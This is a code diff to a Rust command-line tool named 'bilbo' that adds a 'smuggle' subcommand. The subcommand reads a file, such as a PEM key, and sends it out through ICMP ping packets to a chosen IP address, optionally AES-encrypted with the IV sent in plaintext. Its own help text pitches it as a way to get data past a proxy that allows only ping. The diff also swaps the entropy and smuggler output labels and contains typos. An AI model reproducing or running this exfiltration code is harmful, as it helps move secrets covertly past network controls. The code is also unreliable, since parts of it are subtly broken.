@@ -1,9 +1,11 @@
 use bilbo::entropy;
 use clap::{Command, command, arg, value_parser};
+use std::net::{IpAddr, Ipv4Addr};
 use std::path::PathBuf;
 use std::io::{Error, ErrorKind, Result, Write};
 use std::fs::read_to_string;
 use bilbo::rsa::{PickLock, to_pem, KeyType};
+use bilbo::smuggler::{ping_cipher, ping_plain, Config};
 
 const EXPLAIN: &str = "
 [ 🐉 🏔 💎 ] BILBO
@@ -42,13 +44,32 @@ In addition to complexity and nonequilibrium, most, not all, complex systems als
 The concept of entropy was used by Shannon in information theory for the data communication of computer sciences and is known as Shannon entropy.
 Based on this concept, the mean value of the shortest possibilities required to code a message is the division of the symbol logarithm in the alphabet by the entropy.
 Entropy refers to a measurement of vagueness and randomness in a system. If we assume that all the available data belong to one class, it will not be hard to predict the class of a new data.
+
+[ 📦 ] Message smuggler via ping.
+
+The message smuggler via ping allows to smuggle message in plain text or encrypted message with 16 bytes long key via ping.
+Smuggler may be useful when proxy blocks internet traffic but allows ping and you want to send message outside.
+Encryption used for the message is EAS and encrypts 16 bytes long blocks that are collected in to buffer and then
+sent via ping in 24 bytes long chunks. The initialization vector is transferred on the end of communication in plaintext.
 ";
 
 fn main() {
     let cmd = Command::new("bilbo")
         .bin_name("bilbo")
         .subcommand_required(true)
-        .about("🧝 Bilbo is a simple CLI cyber security tool. Scans files to discover hidden information.")
+        .about("🧝 Bilbo is a simple CLI cyber security tool. Scans files to discover hidden information and helps send them secretly.")
+        .subcommand(
+            command!("smuggle")
+            .about("Smuggles the file via ping.")
+            .arg(
+                arg!(--"file" <FILE> "Path to file in PEM format to be smuggled")
+                    .value_parser(value_parser!(PathBuf)),
+            ).arg(
+                arg!(--"ip" <IP> "IPv4 to the server that will collect smuggled file.").value_parser(value_parser!(Ipv4Addr)),
+            ).arg(
+                arg!(--"encrypt" <KEY> "Encryption key.").value_parser(value_parser!(Vec<u8>)),
+            )
+        )
         .subcommand(
             command!("picklock")
             .about("Attempts to pick lock the rsa key.")
@@ -83,12 +104,16 @@ fn main() {
         },
         Some(("entropy", matches)) => {
             match run_entropy(matches.get_one::<PathBuf>("file"), matches.get_one::<u8>("report")) {
-                Ok(s) => println!("📶 Entropy:\n{s}\n"),
+                Ok(s) => println!("📦 Ping Smuggler: \n{s}\n"),
                 Err(e) => println!("🤷 Failure: {}", e.to_string()),
             }
 
         },
-        Some(("explain", _matcher)) => println!("{EXPLAIN}"),
+        Some(("smuggle", matches)) => match smuggle_file_via_ping(matches.get_one("file"), matches.get_one("ip"), matches.get_one("encrypt")) {
+                Ok(s) => println!("📶 Entropy:\n{s}\n"),
+                Err(e) => println!("🤷 Failure: {}", e.to_string()),
+        }
+        Some(("explain", _matches)) => println!("{EXPLAIN}"),
         None => (),
         _ => unreachable!("unreachable code"),
     };   
@@ -171,6 +196,44 @@ fn run_entropy(path: Option<&PathBuf>, report_level: Option<&u8>) -> Result<Stri
     result.push_str(&format!("| {0: <6} | {1: <7} | {2: <6} | {3: <24} |\n", "TOTAL", total_entropy, total_bts, "")); 
 
     Ok(result)
+}
+
+fn smuggle_file_via_ping(file: Option<&PathBuf>, ip: Option<&Ipv4Addr>, key: Option<&Vec<u8>>) -> Result<String> {
+    let Some(path) = file else {
+        return Err(Error::new(ErrorKind::InvalidInput, "empty or incorrect file path"));
+    };
+    let Some(ip) = ip else {
+        return Err(Error::new(ErrorKind::InvalidInput, "empty or incorrect ip address"));
+    };
+    
+    let data = read_to_string(path)?;
+    
+    match key {
+        None => {
+            ping_plain(IpAddr::V4(*ip), &data.as_bytes(), &Config::default())?;
+            Ok(format!("File {:?} smuggled to {}\n", path.as_os_str(), ip.to_string()).to_string())
+        },
+        Some(k) => {
+            if k.len() != 16 {
+                return Err(
+                    Error::new(ErrorKind::InvalidInput, 
+                    format!("incorrect kye size, expected 16 bytes, got {} bytes", k.len())),
+                );
+            }
+
+            let cfg = Config::default();
+            let mut enc_key: [u8;16] = [0;16];
+            for i in 0..16 {
+                enc_key[i] = k[i];
+            }
+
+            let ip = IpAddr::V4(*ip);
+            let vi = ping_cipher(ip, &data.as_bytes(), &enc_key, &cfg)?;
+            ping_plain(ip, &vi, &cfg)?;
+
+            Ok(format!("File {:?} smuggled to {}, with IV: {:?} \n", path.as_os_str(), ip.to_string(), vi).to_string())
+        },
+    }
 }
 
 fn check_level(level: Option<&u8>) -> Result<u8> {
